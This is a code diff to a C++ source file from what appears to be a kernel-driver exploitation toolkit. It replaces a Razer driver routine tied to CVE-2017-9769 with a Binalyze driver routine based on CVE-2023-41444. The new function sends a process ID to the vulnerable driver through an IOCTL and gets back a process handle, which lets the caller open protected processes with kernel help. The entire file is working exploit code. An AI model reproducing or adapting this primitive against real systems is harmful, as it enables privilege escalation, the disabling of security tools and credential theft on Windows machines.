@@ -1,14 +1,14 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2023
+*  (C) COPYRIGHT AUTHORS, 2023
 *
-*  TITLE:       RZPNK.CPP
+*  TITLE:       BINALYZE.CPP
 *
 *  VERSION:     1.40
 *
 *  DATE:        20 Oct 2023
 *
-*  Razer Overlay Support driver routines.
+*  Binalyze driver routines.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -18,42 +18,39 @@
 *******************************************************************************/
 
 #include "global.h"
-#include "idrv/rzpnk.h"
+#include "idrv/binalyze.h"
 
 //
-// Based on CVE-2017-9769.
+// Based on CVE-2023-41444
 //
 
 /*
-* RazerOpenProcess
+* BeDrvOpenProcess
 *
 * Purpose:
 *
-* Call ZwOpenProcess via razer driver request.
+* Open process via Binalyze driver.
 *
 */
-BOOL WINAPI RazerOpenProcess(
+BOOL WINAPI BeDrvOpenProcess(
     _In_ HANDLE DeviceHandle,
     _In_ HANDLE ProcessId,
     _In_ ACCESS_MASK DesiredAccess,
-    _Out_ PHANDLE ProcessHandle
-)
+    _Out_ PHANDLE ProcessHandle)
 {
-    BOOL bResult;
-    RAZER_OPEN_PROCESS request;
-
     UNREFERENCED_PARAMETER(DesiredAccess);
 
-    request.ProcessId = ProcessId;
-    request.ProcessHandle = NULL;
+    BOOL bResult = FALSE;
+    DWORD data = HandleToUlong(ProcessId);
 
     bResult = supCallDriver(DeviceHandle,
-        IOCTL_RZPNK_OPEN_PROCESS,
-        &request,
-        sizeof(request),
-        &request,
-        sizeof(request));
+        IOCTL_IREC_OPEN_PROCESS,
+        &data,
+        sizeof(data),
+        &data,
+        sizeof(data));
 
-    *ProcessHandle = request.ProcessHandle;
+    *ProcessHandle = UlongToHandle(data);
+
     return bResult;
 }
